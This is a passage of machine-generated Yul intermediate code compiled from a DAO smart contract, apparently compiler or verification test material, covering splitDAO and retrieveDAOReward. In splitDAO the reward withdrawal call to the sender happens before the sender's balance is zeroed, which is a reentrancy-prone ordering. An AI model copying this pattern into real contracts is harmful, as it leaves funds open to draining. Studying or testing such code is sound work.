                            /// @src 0:39340:39434  "assert(!(p.splitData[0].newDAO.createTokenProxy{value : fundsToBeMoved}(msg.sender) == false))"
                            assert_helper(expr_2136)
                            /// @src 0:39542:39550  "balances"
                            let _505_slot := 0x05
                            let expr_2141_slot := _505_slot
                            /// @src 0:39551:39561  "msg.sender"
                            let expr_2143 := caller()
                            /// @src 0:39542:39562  "balances[msg.sender]"
                            let _506 := mapping_index_access_t_mapping$_t_address_$_t_uint256_$_of_t_address(expr_2141_slot,expr_2143)
                            let _507 := read_from_storage_split_offset_0_t_uint256(_506)
                            let expr_2144 := _507
                            /// @src 0:39565:39566  "p"
                            let _508_slot := var_p_1952_slot
                            let expr_2145_slot := _508_slot
                            /// @src 0:39565:39576  "p.splitData"
                            let _509 := add(expr_2145_slot, 8)
                            let _510_slot := _509
                            let expr_2146_slot := _510_slot
                            /// @src 0:39577:39578  "0"
                            let expr_2147 := 0x00
                            /// @src 0:39565:39579  "p.splitData[0]"

                            let _511, _512 := storage_array_index_access_t_array$_t_struct$_SplitData_$810_storage_$dyn_storage(expr_2146_slot, expr_2147)
                            let _513_slot := _511
                            let expr_2148_slot := _513_slot
                            /// @src 0:39565:39591  "p.splitData[0].rewardToken"
                            let _514 := add(expr_2148_slot, 2)
                            let _515 := read_from_storage_split_offset_0_t_uint256(_514)
                            let expr_2149 := _515
                            /// @src 0:39542:39591  "balances[msg.sender] * p.splitData[0].rewardToken"
                            let expr_2150 := checked_mul_t_uint256(expr_2144, expr_2149)

                            /// @src 0:39541:39592  "(balances[msg.sender] * p.splitData[0].rewardToken)"
                            let expr_2151 := expr_2150
                            /// @src 0:39607:39608  "p"
                            let _516_slot := var_p_1952_slot
                            let expr_2152_slot := _516_slot
                            /// @src 0:39607:39618  "p.splitData"
                            let _517 := add(expr_2152_slot, 8)
                            let _518_slot := _517
                            let expr_2153_slot := _518_slot
                            /// @src 0:39619:39620  "0"
                            let expr_2154 := 0x00
                            /// @src 0:39607:39621  "p.splitData[0]"

                            let _519, _520 := storage_array_index_access_t_array$_t_struct$_SplitData_$810_storage_$dyn_storage(expr_2153_slot, expr_2154)
                            let _521_slot := _519
                            let expr_2155_slot := _521_slot
                            /// @src 0:39607:39633  "p.splitData[0].totalSupply"
                            let _522 := add(expr_2155_slot, 1)
                            let _523 := read_from_storage_split_offset_0_t_uint256(_522)
                            let expr_2156 := _523
                            /// @src 0:39541:39633  "(balances[msg.sender] * p.splitData[0].rewardToken) /..."
                            let expr_2157 := checked_div_t_uint256(expr_2151, expr_2156)

                            /// @src 0:39501:39633  "uint rewardTokenToBeMoved =..."
                            let var_rewardTokenToBeMoved_2140 := expr_2157
                            /// @src 0:39668:39678  "DAOpaidOut"
                            let _524_slot := 0x11
                            let expr_2161_slot := _524_slot
                            /// @src 0:39687:39691  "this"
                            let expr_2164_address := address()
                            /// @src 0:39679:39692  "address(this)"
                            let expr_2165 := convert_t_contract$_DAO_$3021_to_t_address(expr_2164_address)
                            /// @src 0:39668:39693  "DAOpaidOut[address(this)]"
                            let _525 := mapping_index_access_t_mapping$_t_address_$_t_uint256_$_of_t_address(expr_2161_slot,expr_2165)
                            let _526 := read_from_storage_split_offset_0_t_uint256(_525)
                            let expr_2166 := _526
                            /// @src 0:39696:39716  "rewardTokenToBeMoved"
                            let _527 := var_rewardTokenToBeMoved_2140
                            let expr_2167 := _527
                            /// @src 0:39668:39716  "DAOpaidOut[address(this)] * rewardTokenToBeMoved"
                            let expr_2168 := checked_mul_t_uint256(expr_2166, expr_2167)

                            /// @src 0:39731:39742  "rewardToken"
                            let _528_slot := 0x0d
                            let expr_2169_slot := _528_slot
                            /// @src 0:39751:39755  "this"
                            let expr_2172_address := address()
                            /// @src 0:39743:39756  "address(this)"
                            let expr_2173 := convert_t_contract$_DAO_$3021_to_t_address(expr_2172_address)
                            /// @src 0:39731:39757  "rewardToken[address(this)]"
                            let _529 := mapping_index_access_t_mapping$_t_address_$_t_uint256_$_of_t_address(expr_2169_slot,expr_2173)
                            let _530 := read_from_storage_split_offset_0_t_uint256(_529)
                            let expr_2174 := _530
                            /// @src 0:39668:39757  "DAOpaidOut[address(this)] * rewardTokenToBeMoved /..."

                            // NOTE: THIS WAS CRASHING BEFORE.
                            let expr_2175 := checked_div_t_uint256(expr_2168, expr_2174)

                            /// @src 0:39644:39757  "uint paidOutToBeMoved = DAOpaidOut[address(this)] * rewardTokenToBeMoved /..."
                            let var_paidOutToBeMoved_2160 := expr_2175
                            /// @src 0:39815:39835  "rewardTokenToBeMoved"
                            let _531 := var_rewardTokenToBeMoved_2140
                            let expr_2187 := _531
                            /// @src 0:39768:39779  "rewardToken"
                            let _532_slot := 0x0d
                            let expr_2177_slot := _532_slot
                            /// @src 0:39788:39789  "p"
                            let _533_slot := var_p_1952_slot
                            let expr_2180_slot := _533_slot
                            /// @src 0:39788:39799  "p.splitData"
                            let _534 := add(expr_2180_slot, 8)
                            let _535_slot := _534
                            let expr_2181_slot := _535_slot
                            /// @src 0:39800:39801  "0"
                            let expr_2182 := 0x00
                            /// @src 0:39788:39802  "p.splitData[0]"

                            let _536, _537 := storage_array_index_access_t_array$_t_struct$_SplitData_$810_storage_$dyn_storage(expr_2181_slot, expr_2182)
                            let _538_slot := _536
                            let expr_2183_slot := _538_slot
                            /// @src 0:39788:39809  "p.splitData[0].newDAO"
                            let _539 := add(expr_2183_slot, 3)
                            let _540_address := read_from_storage_split_offset_0_t_contract$_DAO_$3021(_539)
                            let expr_2184_address := _540_address
                            /// @src 0:39780:39810  "address(p.splitData[0].newDAO)"
                            let expr_2185 := convert_t_contract$_DAO_$3021_to_t_address(expr_2184_address)
                            /// @src 0:39768:39811  "rewardToken[address(p.splitData[0].newDAO)]"
                            let _541 := mapping_index_access_t_mapping$_t_address_$_t_uint256_$_of_t_address(expr_2177_slot,expr_2185)
                            /// @src 0:39768:39835  "rewardToken[address(p.splitData[0].newDAO)] += rewardTokenToBeMoved"
                            let _542 := read_from_storage_split_offset_0_t_uint256(_541)
                            let expr_2188 := checked_add_t_uint256(_542, expr_2187)

                            update_storage_value_offset_0_t_uint256_to_t_uint256(_541, expr_2188)
                            /// @src 0:39854:39865  "rewardToken"
                            let _543_slot := 0x0d
                            let expr_2191_slot := _543_slot
                            /// @src 0:39874:39878  "this"
                            let expr_2194_address := address()
                            /// @src 0:39866:39879  "address(this)"
                            let expr_2195 := convert_t_contract$_DAO_$3021_to_t_address(expr_2194_address)
                            /// @src 0:39854:39880  "rewardToken[address(this)]"
                            let _544 := mapping_index_access_t_mapping$_t_address_$_t_uint256_$_of_t_address(expr_2191_slot,expr_2195)
                            let _545 := read_from_storage_split_offset_0_t_uint256(_544)
                            let expr_2196 := _545
                            /// @src 0:39883:39903  "rewardTokenToBeMoved"
                            let _546 := var_rewardTokenToBeMoved_2140
                            let expr_2197 := _546
                            /// @src 0:39854:39903  "rewardToken[address(this)] < rewardTokenToBeMoved"
                            let expr_2198 := lt(cleanup_t_uint256(expr_2196), cleanup_t_uint256(expr_2197))
                            /// @src 0:39853:39904  "(rewardToken[address(this)] < rewardTokenToBeMoved)"
                            let expr_2199 := expr_2198
                            /// @src 0:39852:39904  "!(rewardToken[address(this)] < rewardTokenToBeMoved)"
                            let expr_2200 := cleanup_t_bool(iszero(expr_2199))
                            /// @src 0:39845:39905  "assert(!(rewardToken[address(this)] < rewardTokenToBeMoved))"
                            assert_helper(expr_2200)
                            /// @src 0:39945:39965  "rewardTokenToBeMoved"
                            let _547 := var_rewardTokenToBeMoved_2140
                            let expr_2209 := _547
                            /// @src 0:39915:39926  "rewardToken"
                            let _548_slot := 0x0d
                            let expr_2203_slot := _548_slot
                            /// @src 0:39935:39939  "this"
                            let expr_2206_address := address()
                            /// @src 0:39927:39940  "address(this)"
                            let expr_2207 := convert_t_contract$_DAO_$3021_to_t_address(expr_2206_address)
                            /// @src 0:39915:39941  "rewardToken[address(this)]"
                            let _549 := mapping_index_access_t_mapping$_t_address_$_t_uint256_$_of_t_address(expr_2203_slot,expr_2207)
                            /// @src 0:39915:39965  "rewardToken[address(this)] -= rewardTokenToBeMoved"
                            let _550 := read_from_storage_split_offset_0_t_uint256(_549)
                            let expr_2210 := checked_sub_t_uint256(_550, expr_2209)

                            update_storage_value_offset_0_t_uint256_to_t_uint256(_549, expr_2210)
                            /// @src 0:40022:40038  "paidOutToBeMoved"
                            let _551 := var_paidOutToBeMoved_2160
                            let expr_2222 := _551
                            /// @src 0:39976:39986  "DAOpaidOut"
                            let _552_slot := 0x11
                            let expr_2212_slot := _552_slot
                            /// @src 0:39995:39996  "p"
                            let _553_slot := var_p_1952_slot
                            let expr_2215_slot := _553_slot
                            /// @src 0:39995:40006  "p.splitData"
                            let _554 := add(expr_2215_slot, 8)
                            let _555_slot := _554
                            let expr_2216_slot := _555_slot
                            /// @src 0:40007:40008  "0"
                            let expr_2217 := 0x00
                            /// @src 0:39995:40009  "p.splitData[0]"

                            let _556, _557 := storage_array_index_access_t_array$_t_struct$_SplitData_$810_storage_$dyn_storage(expr_2216_slot, expr_2217)
                            let _558_slot := _556
                            let expr_2218_slot := _558_slot
                            /// @src 0:39995:40016  "p.splitData[0].newDAO"
                            let _559 := add(expr_2218_slot, 3)
                            let _560_address := read_from_storage_split_offset_0_t_contract$_DAO_$3021(_559)
                            let expr_2219_address := _560_address
                            /// @src 0:39987:40017  "address(p.splitData[0].newDAO)"
                            let expr_2220 := convert_t_contract$_DAO_$3021_to_t_address(expr_2219_address)
                            /// @src 0:39976:40018  "DAOpaidOut[address(p.splitData[0].newDAO)]"
                            let _561 := mapping_index_access_t_mapping$_t_address_$_t_uint256_$_of_t_address(expr_2212_slot,expr_2220)
                            /// @src 0:39976:40038  "DAOpaidOut[address(p.splitData[0].newDAO)] += paidOutToBeMoved"
                            let _562 := read_from_storage_split_offset_0_t_uint256(_561)
                            let expr_2223 := checked_add_t_uint256(_562, expr_2222)

                            update_storage_value_offset_0_t_uint256_to_t_uint256(_561, expr_2223)
                            /// @src 0:40057:40067  "DAOpaidOut"
                            let _563_slot := 0x11
                            let expr_2226_slot := _563_slot
                            /// @src 0:40076:40080  "this"
                            let expr_2229_address := address()
                            /// @src 0:40068:40081  "address(this)"
                            let expr_2230 := convert_t_contract$_DAO_$3021_to_t_address(expr_2229_address)
                            /// @src 0:40057:40082  "DAOpaidOut[address(this)]"
                            let _564 := mapping_index_access_t_mapping$_t_address_$_t_uint256_$_of_t_address(expr_2226_slot,expr_2230)
                            let _565 := read_from_storage_split_offset_0_t_uint256(_564)
                            let expr_2231 := _565
                            /// @src 0:40085:40101  "paidOutToBeMoved"
                            let _566 := var_paidOutToBeMoved_2160
                            let expr_2232 := _566
                            /// @src 0:40057:40101  "DAOpaidOut[address(this)] < paidOutToBeMoved"
                            let expr_2233 := lt(cleanup_t_uint256(expr_2231), cleanup_t_uint256(expr_2232))
                            /// @src 0:40056:40102  "(DAOpaidOut[address(this)] < paidOutToBeMoved)"
                            let expr_2234 := expr_2233
                            /// @src 0:40055:40102  "!(DAOpaidOut[address(this)] < paidOutToBeMoved)"
                            let expr_2235 := cleanup_t_bool(iszero(expr_2234))
                            /// @src 0:40048:40103  "assert(!(DAOpaidOut[address(this)] < paidOutToBeMoved))"
                            assert_helper(expr_2235)
                            /// @src 0:40142:40158  "paidOutToBeMoved"
                            let _567 := var_paidOutToBeMoved_2160
                            let expr_2244 := _567
                            /// @src 0:40113:40123  "DAOpaidOut"
                            let _568_slot := 0x11
                            let expr_2238_slot := _568_slot
                            /// @src 0:40132:40136  "this"
                            let expr_2241_address := address()
                            /// @src 0:40124:40137  "address(this)"
                            let expr_2242 := convert_t_contract$_DAO_$3021_to_t_address(expr_2241_address)
                            /// @src 0:40113:40138  "DAOpaidOut[address(this)]"
                            let _569 := mapping_index_access_t_mapping$_t_address_$_t_uint256_$_of_t_address(expr_2238_slot,expr_2242)
                            /// @src 0:40113:40158  "DAOpaidOut[address(this)] -= paidOutToBeMoved"
                            let _570 := read_from_storage_split_offset_0_t_uint256(_569)
                            let expr_2245 := checked_sub_t_uint256(_570, expr_2244)

                            update_storage_value_offset_0_t_uint256_to_t_uint256(_569, expr_2245)
                            /// @src 0:40210:40220  "msg.sender"
                            let expr_2249 := caller()
                            /// @src 0:40230:40231  "0"
                            let expr_2252 := 0x00
                            /// @src 0:40222:40232  "address(0)"
                            let expr_2253 := convert_t_rational_0_by_1_to_t_address(expr_2252)
                            /// @src 0:40234:40242  "balances"
                            let _571_slot := 0x05
                            let expr_2254_slot := _571_slot
                            /// @src 0:40243:40253  "msg.sender"
                            let expr_2256 := caller()
                            /// @src 0:40234:40254  "balances[msg.sender]"
                            let _572 := mapping_index_access_t_mapping$_t_address_$_t_uint256_$_of_t_address(expr_2254_slot,expr_2256)
                            let _573 := read_from_storage_split_offset_0_t_uint256(_572)
                            let expr_2257 := _573
                            /// @src 0:40201:40255  "Transfer(msg.sender, address(0), balances[msg.sender])"
                            let _574 := 0xddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef
                            let _575 := convert_t_address_to_t_address(expr_2249)
                            let _576 := convert_t_address_to_t_address(expr_2253)
                            {
                                let _577 := allocate_unbounded()
                                let _578 := abi_encode_tuple_t_uint256__to_t_uint256__fromStack(_577 , expr_2257)
                                log3(_577, sub(_578, _577) , _574, _575, _576)
                            }/// @src 0:40283:40293  "msg.sender"
                            let expr_2262 := caller()
                            /// @src 0:40265:40294  "withdrawRewardFor(msg.sender)"
                            let expr_2263 := fun_withdrawRewardFor_2534(expr_2262)
                            /// @src 0:40351:40359  "balances"
                            let _579_slot := 0x05
                            let expr_2266_slot := _579_slot
                            /// @src 0:40360:40370  "msg.sender"
                            let expr_2268 := caller()
                            /// @src 0:40351:40371  "balances[msg.sender]"
                            let _580 := mapping_index_access_t_mapping$_t_address_$_t_uint256_$_of_t_address(expr_2266_slot,expr_2268)
                            let _581 := read_from_storage_split_offset_0_t_uint256(_580)
                            let expr_2269 := _581
                            /// @src 0:40336:40371  "totalSupply -= balances[msg.sender]"
                            let _582 := read_from_storage_split_offset_0_t_uint256(0x07)
                            let expr_2270 := checked_sub_t_uint256(_582, expr_2269)

                            update_storage_value_offset_0_t_uint256_to_t_uint256(0x07, expr_2270)
                            /// @src 0:40404:40405  "0"
                            let expr_2276 := 0x00
                            /// @src 0:40381:40405  "balances[msg.sender] = 0"
                            let _583 := convert_t_rational_0_by_1_to_t_uint256(expr_2276)
                            /// @src 0:40381:40389  "balances"
                            let _584_slot := 0x05
                            let expr_2272_slot := _584_slot
                            /// @src 0:40390:40400  "msg.sender"
                            let expr_2274 := caller()
                            /// @src 0:40381:40401  "balances[msg.sender]"
                            let _585 := mapping_index_access_t_mapping$_t_address_$_t_uint256_$_of_t_address(expr_2272_slot,expr_2274)
                            /// @src 0:40381:40405  "balances[msg.sender] = 0"
                            update_storage_value_offset_0_t_uint256_to_t_uint256(_585, _583)
                            let expr_2277 := _583
                            /// @src 0:40437:40438  "0"
                            let expr_2283 := 0x00
                            /// @src 0:40415:40438  "paidOut[msg.sender] = 0"
                            let _586 := convert_t_rational_0_by_1_to_t_uint256(expr_2283)
                            /// @src 0:40415:40422  "paidOut"
                            let _587_slot := 0x12
                            let expr_2279_slot := _587_slot
                            /// @src 0:40423:40433  "msg.sender"
                            let expr_2281 := caller()
                            /// @src 0:40415:40434  "paidOut[msg.sender]"
                            let _588 := mapping_index_access_t_mapping$_t_address_$_t_uint256_$_of_t_address(expr_2279_slot,expr_2281)
                            /// @src 0:40415:40438  "paidOut[msg.sender] = 0"
                            update_storage_value_offset_0_t_uint256_to_t_uint256(_588, _586)
                            let expr_2284 := _586
                            /// @src 0:40455:40459  "true"
                            let expr_2286 := 0x01
                            /// @src 0:40448:40459  "return true"
                            var__success_1948 := expr_2286
                            leave

                        }
                        /// @src 0:29431:47042  "contract DAO is DAOInterface, TokenCreation {..."

                        /// @ast-id 2289
                        /// @src 0:37613:40466  "function splitDAO(..."
                        function fun_splitDAO_2289(var__proposalID_1940, var__newCurator_1942) -> var__success_1948 {
                            /// @src 0:37736:37749  "bool _success"
                            let zero_t_bool_388 := zero_value_for_split_t_bool()
                            var__success_1948 := zero_t_bool_388

                            var__success_1948 := modifier_onlyTokenholders_1945(var__success_1948, var__proposalID_1940, var__newCurator_1942)
                        }
                        /// @src 0:29431:47042  "contract DAO is DAOInterface, TokenCreation {..."

                        /// @ast-id 2944
                        /// @src 0:46191:46398  "function numberOfProposals() public view override returns (uint _numberOfProposals) {..."
                        function fun_numberOfProposals_2944() -> var__numberOfProposals_2936 {
                            /// @src 0:46250:46273  "uint _numberOfProposals"
                            let zero_t_uint256_589 := zero_value_for_split_t_uint256()
                            var__numberOfProposals_2936 := zero_t_uint256_589

                            /// @src 0:46371:46380  "proposals"
                            let _590_slot := 0x08
                            let expr_2938_slot := _590_slot
                            /// @src 0:46371:46387  "proposals.length"
                            let expr_2939 := array_length_t_array$_t_struct$_Proposal_$800_storage_$dyn_storage(expr_2938_slot)
                            /// @src 0:46390:46391  "1"
                            let expr_2940 := 0x01
                            /// @src 0:46371:46391  "proposals.length - 1"
                            let expr_2941 := checked_sub_t_uint256(expr_2939, convert_t_rational_1_by_1_to_t_uint256(expr_2940))

                            /// @src 0:46364:46391  "return proposals.length - 1"
                            var__numberOfProposals_2936 := expr_2941
                            leave

                        }
                        /// @src 0:29431:47042  "contract DAO is DAOInterface, TokenCreation {..."

                        function convert_t_address_to_t_contract$_DAO_$3021(value) -> converted {
                            converted := convert_t_uint160_to_t_contract$_DAO_$3021(value)
                        }

                        function cleanup_t_contract$_ManagedAccount_$375(value) -> cleaned {
                            cleaned := cleanup_t_address_payable(value)
                        }

                        function validator_revert_t_contract$_ManagedAccount_$375(value) {
                            if iszero(eq(value, cleanup_t_contract$_ManagedAccount_$375(value))) { revert(0, 0) }
                        }

                        function abi_decode_t_contract$_ManagedAccount_$375_fromMemory(offset, end) -> value {
                            value := mload(offset)
                            validator_revert_t_contract$_ManagedAccount_$375(value)
                        }

                        function abi_decode_tuple_t_contract$_ManagedAccount_$375_fromMemory(headStart, dataEnd) -> value0 {
                            if slt(sub(dataEnd, headStart), 32) { revert_error_dbdddcbe895c83990c08b3492a0e83918d802a52331272ac6fdb6a7c4aea3b1b() }

                            {

                                let offset := 0

                                value0 := abi_decode_t_contract$_ManagedAccount_$375_fromMemory(add(headStart, offset), dataEnd)
                            }

                        }

                        /// @ast-id 2461
                        /// @src 0:41001:41715  "function retrieveDAOReward(bool _toMembers) external override returns (bool _success) {..."
                        function fun_retrieveDAOReward_2461(var__toMembers_2369) -> var__success_2373 {
                            /// @src 0:41072:41085  "bool _success"
                            let zero_t_bool_591 := zero_value_for_split_t_bool()
                            var__success_2373 := zero_t_bool_591

                            /// @src 0:41111:41121  "msg.sender"
                            let expr_2380 := caller()
                            /// @src 0:41107:41122  "DAO(msg.sender)"
                            let expr_2381_address := convert_t_address_to_t_contract$_DAO_$3021(expr_2380)
                            /// @src 0:41097:41122  "DAO dao = DAO(msg.sender)"
                            let var_dao_2377_address := expr_2381_address
                            /// @src 0:41143:41154  "rewardToken"
                            let _592_slot := 0x0d
                            let expr_2384_slot := _592_slot
                            /// @src 0:41155:41165  "msg.sender"
                            let expr_2386 := caller()
                            /// @src 0:41143:41166  "rewardToken[msg.sender]"
                            let _593 := mapping_index_access_t_mapping$_t_address_$_t_uint256_$_of_t_address(expr_2384_slot,expr_2386)
                            let _594 := read_from_storage_split_offset_0_t_uint256(_593)
                            let expr_2387 := _594
                            /// @src 0:41169:41185  "DAOrewardAccount"
                            let _595_address := read_from_storage_split_offset_0_t_contract$_ManagedAccount_$375(0x10)
                            let expr_2388_address := _595_address
                            /// @src 0:41169:41202  "DAOrewardAccount.accumulatedInput"
                            let expr_2389_address := convert_t_contract$_ManagedAccount_$375_to_t_address(expr_2388_address)
                            let expr_2389_functionSelector := 0xd2cc718f
                            /// @src 0:41169:41204  "DAOrewardAccount.accumulatedInput()"

                            // storage for arguments and returned data
                            let _596 := allocate_unbounded()
                            mstore(_596, shift_left_224(expr_2389_functionSelector))
                            let _597 := abi_encode_tuple__to__fromStack(add(_596, 4) )


                            let _598 := staticcall(gas(), expr_2389_address,  _596, sub(_597, _596), _596, 32)

                            if iszero(_598) { revert_forward_1() }

                            let expr_2390
                            if _598 {

                                let _599 := 32

                                if gt(_599, returndatasize()) {
                                    _599 := returndatasize()
                                }

                                // update freeMemoryPointer according to dynamic return size
                                finalize_allocation(_596, _599)

                                // decode return parameters from external try-call into retVars
                                expr_2390 :=  abi_decode_tuple_t_uint256_fromMemory(_596, add(_596, _599))
                            }
                            /// @src 0:41143:41204  "rewardToken[msg.sender] * DAOrewardAccount.accumulatedInput()"
                            let expr_2391 := checked_mul_t_uint256(expr_2387, expr_2390)

                            /// @src 0:41142:41205  "(rewardToken[msg.sender] * DAOrewardAccount.accumulatedInput())"
                            let expr_2392 := expr_2391
                            /// @src 0:41220:41236  "totalRewardToken"
                            let _600 := read_from_storage_split_offset_0_t_uint256(0x0e)
                            let expr_2393 := _600
                            /// @src 0:41142:41236  "(rewardToken[msg.sender] * DAOrewardAccount.accumulatedInput()) /..."
                            let expr_2394 := checked_div_t_uint256(expr_2392, expr_2393)

                            /// @src 0:41239:41249  "DAOpaidOut"
                            let _601_slot := 0x11
                            let expr_2395_slot := _601_slot
                            /// @src 0:41250:41260  "msg.sender"
                            let expr_2397 := caller()
                            /// @src 0:41239:41261  "DAOpaidOut[msg.sender]"
                            let _602 := mapping_index_access_t_mapping$_t_address_$_t_uint256_$_of_t_address(expr_2395_slot,expr_2397)
                            let _603 := read_from_storage_split_offset_0_t_uint256(_602)
                            let expr_2398 := _603
                            /// @src 0:41142:41261  "(rewardToken[msg.sender] * DAOrewardAccount.accumulatedInput()) /..."
                            let expr_2399 := lt(cleanup_t_uint256(expr_2394), cleanup_t_uint256(expr_2398))
                            /// @src 0:41141:41262  "((rewardToken[msg.sender] * DAOrewardAccount.accumulatedInput()) /..."
                            let expr_2400 := expr_2399
                            /// @src 0:41140:41262  "!((rewardToken[msg.sender] * DAOrewardAccount.accumulatedInput()) /..."
                            let expr_2401 := cleanup_t_bool(iszero(expr_2400))
                            /// @src 0:41133:41263  "assert(!((rewardToken[msg.sender] * DAOrewardAccount.accumulatedInput()) /..."
                            assert_helper(expr_2401)
                            /// @src 0:41309:41320  "rewardToken"
                            let _604_slot := 0x0d
                            let expr_2406_slot := _604_slot
                            /// @src 0:41321:41331  "msg.sender"
                            let expr_2408 := caller()
                            /// @src 0:41309:41332  "rewardToken[msg.sender]"
                            let _605 := mapping_index_access_t_mapping$_t_address_$_t_uint256_$_of_t_address(expr_2406_slot,expr_2408)
                            let _606 := read_from_storage_split_offset_0_t_uint256(_605)
                            let expr_2409 := _606
                            /// @src 0:41335:41351  "DAOrewardAccount"
                            let _607_address := read_from_storage_split_offset_0_t_contract$_ManagedAccount_$375(0x10)
                            let expr_2410_address := _607_address
                            /// @src 0:41335:41368  "DAOrewardAccount.accumulatedInput"
                            let expr_2411_address := convert_t_contract$_ManagedAccount_$375_to_t_address(expr_2410_address)
                            let expr_2411_functionSelector := 0xd2cc718f
                            /// @src 0:41335:41370  "DAOrewardAccount.accumulatedInput()"

                            // storage for arguments and returned data
                            let _608 := allocate_unbounded()
                            mstore(_608, shift_left_224(expr_2411_functionSelector))
                            let _609 := abi_encode_tuple__to__fromStack(add(_608, 4) )


                            let _610 := staticcall(gas(), expr_2411_address,  _608, sub(_609, _608), _608, 32)

                            if iszero(_610) { revert_forward_1() }

                            let expr_2412
                            if _610 {

                                let _611 := 32

                                if gt(_611, returndatasize()) {
                                    _611 := returndatasize()
                                }

                                // update freeMemoryPointer according to dynamic return size
                                finalize_allocation(_608, _611)

                                // decode return parameters from external try-call into retVars
                                expr_2412 :=  abi_decode_tuple_t_uint256_fromMemory(_608, add(_608, _611))
                            }
                            /// @src 0:41309:41370  "rewardToken[msg.sender] * DAOrewardAccount.accumulatedInput()"
                            let expr_2413 := checked_mul_t_uint256(expr_2409, expr_2412)

                            /// @src 0:41308:41371  "(rewardToken[msg.sender] * DAOrewardAccount.accumulatedInput())"
                            let expr_2414 := expr_2413
                            /// @src 0:41386:41402  "totalRewardToken"
                            let _612 := read_from_storage_split_offset_0_t_uint256(0x0e)
                            let expr_2415 := _612
                            /// @src 0:41308:41402  "(rewardToken[msg.sender] * DAOrewardAccount.accumulatedInput()) /..."
                            let expr_2416 := checked_div_t_uint256(expr_2414, expr_2415)

                            /// @src 0:41405:41415  "DAOpaidOut"
                            let _613_slot := 0x11
                            let expr_2417_slot := _613_slot
                            /// @src 0:41416:41426  "msg.sender"
                            let expr_2419 := caller()
                            /// @src 0:41405:41427  "DAOpaidOut[msg.sender]"
                            let _614 := mapping_index_access_t_mapping$_t_address_$_t_uint256_$_of_t_address(expr_2417_slot,expr_2419)
                            let _615 := read_from_storage_split_offset_0_t_uint256(_614)
                            let expr_2420 := _615
                            /// @src 0:41308:41427  "(rewardToken[msg.sender] * DAOrewardAccount.accumulatedInput()) /..."
                            let expr_2421 := checked_sub_t_uint256(expr_2416, expr_2420)

                            /// @src 0:41282:41427  "uint reward =..."
                            let var_reward_2405 := expr_2421
                            /// @src 0:41440:41450  "_toMembers"
                            let _616 := var__toMembers_2369
                            let expr_2423 := _616
                            /// @src 0:41437:41646  "if(_toMembers) {..."
                            switch expr_2423
                            case 0 {
                                /// @src 0:41589:41605  "DAOrewardAccount"
                                let _617_address := read_from_storage_split_offset_0_t_contract$_ManagedAccount_$375(0x10)
                                let expr_2439_address := _617_address
                                /// @src 0:41589:41612  "DAOrewardAccount.payOut"
                                let expr_2440_address := convert_t_contract$_ManagedAccount_$375_to_t_address(expr_2439_address)
                                let expr_2440_functionSelector := 0x0221038a
                                /// @src 0:41621:41624  "dao"
                                let _618_address := var_dao_2377_address
                                let expr_2443_address := _618_address
                                /// @src 0:41613:41625  "address(dao)"
                                let expr_2444 := convert_t_contract$_DAO_$3021_to_t_address(expr_2443_address)
                                /// @src 0:41627:41633  "reward"
                                let _619 := var_reward_2405
                                let expr_2445 := _619
                                /// @src 0:41589:41634  "DAOrewardAccount.payOut(address(dao), reward)"

                                // storage for arguments and returned data
                                let _620 := allocate_unbounded()
                                mstore(_620, shift_left_224(expr_2440_functionSelector))
                                let _621 := abi_encode_tuple_t_address_t_uint256__to_t_address_t_uint256__fromStack(add(_620, 4) , expr_2444, expr_2445)



                                let _622 := call(gas(), expr_2440_address,  0,  _620, sub(_621, _620), _620, 32)

                                if iszero(_622) { revert_forward_1() }

                                let expr_2446
                                if _622 {

                                    let _623 := 32

                                    if gt(_623, returndatasize()) {
                                        _623 := returndatasize()
                                    }

                                    // update freeMemoryPointer according to dynamic return size
                                    finalize_allocation(_620, _623)

                                    // decode return parameters from external try-call into retVars
                                    expr_2446 :=  abi_decode_tuple_t_bool_fromMemory(_620, add(_620, _623))
                                }
                                /// @src 0:41582:41635  "assert(DAOrewardAccount.payOut(address(dao), reward))"
                                assert_helper(expr_2446)
                                /// @src 0:41437:41646  "if(_toMembers) {..."
                            }
                            default {
                                /// @src 0:41473:41489  "DAOrewardAccount"
                                let _624_address := read_from_storage_split_offset_0_t_contract$_ManagedAccount_$375(0x10)
                                let expr_2425_address := _624_address
                                /// @src 0:41473:41496  "DAOrewardAccount.payOut"
                                let expr_2426_address := convert_t_contract$_ManagedAccount_$375_to_t_address(expr_2425_address)
                                let expr_2426_functionSelector := 0x0221038a
                                /// @src 0:41505:41508  "dao"
                                let _625_address := var_dao_2377_address
                                let expr_2429_address := _625_address
                                /// @src 0:41505:41522  "dao.rewardAccount"
                                let expr_2430_address := convert_t_contract$_DAO_$3021_to_t_address(expr_2429_address)
                                let expr_2430_functionSelector := 0x0e708203
                                /// @src 0:41505:41524  "dao.rewardAccount()"

                                // storage for arguments and returned data
                                let _626 := allocate_unbounded()
                                mstore(_626, shift_left_224(expr_2430_functionSelector))
                                let _627 := abi_encode_tuple__to__fromStack(add(_626, 4) )


                                let _628 := staticcall(gas(), expr_2430_address,  _626, sub(_627, _626), _626, 32)

                                if iszero(_628) { revert_forward_1() }

                                let expr_2431_address
                                if _628 {

                                    let _629 := 32

                                    if gt(_629, returndatasize()) {
                                        _629 := returndatasize()
                                    }

                                    // update freeMemoryPointer according to dynamic return size
                                    finalize_allocation(_626, _629)

                                    // decode return parameters from external try-call into retVars
                                    expr_2431_address :=  abi_decode_tuple_t_contract$_ManagedAccount_$375_fromMemory(_626, add(_626, _629))
                                }
                                /// @src 0:41497:41525  "address(dao.rewardAccount())"
                                let expr_2432 := convert_t_contract$_ManagedAccount_$375_to_t_address(expr_2431_address)
                                /// @src 0:41527:41533  "reward"
                                let _630 := var_reward_2405
                                let expr_2433 := _630
                                /// @src 0:41473:41534  "DAOrewardAccount.payOut(address(dao.rewardAccount()), reward)"

                                // storage for arguments and returned data
                                let _631 := allocate_unbounded()
                                mstore(_631, shift_left_224(expr_2426_functionSelector))
                                let _632 := abi_encode_tuple_t_address_t_uint256__to_t_address_t_uint256__fromStack(add(_631, 4) , expr_2432, expr_2433)


                                let _633 := call(gas(), expr_2426_address,  0,  _631, sub(_632, _631), _631, 32)

                                if iszero(_633) { revert_forward_1() }

                                let expr_2434
                                if _633 {

                                    let _634 := 32

                                    if gt(_634, returndatasize()) {
                                        _634 := returndatasize()
                                    }

                                    // update freeMemoryPointer according to dynamic return size
                                    finalize_allocation(_631, _634)

                                    // decode return parameters from external try-call into retVars
                                    expr_2434 :=  abi_decode_tuple_t_bool_fromMemory(_631, add(_631, _634))
                                }
                                /// @src 0:41466:41535  "assert(DAOrewardAccount.payOut(address(dao.rewardAccount()), reward))"
                                assert_helper(expr_2434)
